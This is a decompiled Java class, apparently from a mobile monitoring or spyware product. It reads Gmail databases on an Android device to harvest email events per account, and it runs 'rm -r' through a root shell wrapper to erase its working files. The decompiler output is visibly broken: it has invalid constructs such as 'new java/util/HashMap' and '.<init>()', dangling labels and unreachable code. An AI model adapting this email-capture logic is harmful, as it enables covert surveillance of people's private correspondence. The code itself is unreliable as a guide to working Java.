package com.vvt.capture.email.gmail.a;

import com.vvt.ak.a;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.a.d;
import com.vvt.capture.email.gmail.GmailEventReference;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private String c;
  private d d;
  private String e;
  
  private String b()
  {
    return p.a(this.c, "gm");
  }
  
  private void c()
  {
    String str1 = b();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    boolean bool2 = false;
    Object localObject1 = null;
    try
    {
      localObject1 = c.a();
      if (localObject1 == null) {
        break label199;
      }
      try
      {
        Object localObject2 = c.a((String)localObject1);
        Iterator localIterator = ((HashSet)localObject2).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject2 = localIterator.next();
          localObject2 = (String)localObject2;
          Object localObject5 = this.c;
          String str = this.e;
          localObject5 = c.a((String)localObject1, (String)localObject2, (String)localObject5, str);
          boolean bool3 = com.vvt.ag.b.a((String)localObject5);
          if (!bool3)
          {
            long l = com.vvt.capture.email.gmail.b.a((String)localObject5, (String)localObject2);
            localObject5 = Long.valueOf(l);
            localHashMap.put(localObject2, localObject5);
          }
        }
        bool2 = b;
      }
      catch (Exception localException1)
      {
        localObject3 = localObject1;
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        Object localObject3;
        label199:
        bool1 = false;
        Object localObject4 = null;
      }
    }
    if (bool2) {}
    for (;;)
    {
      localObject1 = new com/vvt/capture/email/gmail/GmailEventReference;
      ((GmailEventReference)localObject1).<init>();
      if (localObject3 == null) {
        localObject3 = "";
      }
      ((GmailEventReference)localObject1).setDatabasePath((String)localObject3);
      ((GmailEventReference)localObject1).setReference(localHashMap);
      bool1 = a;
      if (bool1) {}
      return (g)localObject1;
      c();
      localObject3 = localObject1;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str1 = c.a();
      bool1 = a;
      if (bool1) {}
      bool1 = com.vvt.ag.b.a(str1);
      if (!bool1)
      {
        Object localObject1 = c.a(str1);
        Iterator localIterator = ((HashSet)localObject1).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          Object localObject2 = localIterator.next();
          localObject2 = (String)localObject2;
          localObject1 = this.c;
          Object localObject3 = this.e;
          localObject1 = c.a(str1, (String)localObject2, (String)localObject1, (String)localObject3);
          boolean bool2 = a;
          if (bool2) {}
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (!bool2)
          {
            localObject3 = this.d;
            String str2 = this.c;
            String str3 = this.e;
            localObject1 = com.vvt.capture.email.gmail.b.a((String)localObject1, (String)localObject2, (d)localObject3, paramInt, str2, str3);
            boolean bool3 = a;
            if (bool3) {}
            localArrayList.addAll((Collection)localObject1);
          }
        }
      }
      bool1 = a;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (!bool1) {}
    }
    for (;;)
    {
      if (bool1) {}
      return localArrayList;
      c();
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof GmailEventReference;
    boolean bool2;
    long l;
    if (bool1)
    {
      bool1 = paramg2 instanceof GmailEventReference;
      if (bool1) {
        try
        {
          paramg1 = (GmailEventReference)paramg1;
          paramg2 = (GmailEventReference)paramg2;
          HashMap localHashMap = paramg1.getReference();
          String str1 = paramg2.getDatabasePath();
          bool1 = a;
          if ((!bool1) || (str1 != null))
          {
            int i = str1.length();
            if (i > 0)
            {
              Object localObject1 = c.a(str1);
              Iterator localIterator = ((HashSet)localObject1).iterator();
              for (;;)
              {
                bool2 = localIterator.hasNext();
                if (!bool2) {
                  break label268;
                }
                Object localObject2 = localIterator.next();
                localObject2 = (String)localObject2;
                bool2 = localHashMap.containsKey(localObject2);
                if (!bool2) {
                  break;
                }
                localObject1 = localHashMap.get(localObject2);
                localObject1 = (Long)localObject1;
                l = ((Long)localObject1).longValue();
                localObject1 = this.c;
                Object localObject3 = this.e;
                localObject1 = c.a(str1, (String)localObject2, (String)localObject1, (String)localObject3);
                localObject3 = this.d;
                String str2 = this.c;
                String str3 = this.e;
                localObject1 = com.vvt.capture.email.gmail.b.a((String)localObject1, (String)localObject2, l, (d)localObject3, str2, str3);
                boolean bool3 = a;
                if (bool3) {}
                localArrayList.addAll((Collection)localObject1);
              }
            }
          }
          bool2 = a;
        }
        catch (Exception localException)
        {
          bool2 = b;
          if (!bool2) {}
        }
      }
    }
    for (;;)
    {
      if (bool2) {}
      return localArrayList;
      l = 0L;
      break;
      label268:
      c();
    }
  }
  
  public void a(d paramd)
  {
    this.d = paramd;
  }
  
  public void a(String paramString)
  {
    this.e = paramString;
  }
  
  public void b(String paramString)
  {
    this.c = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */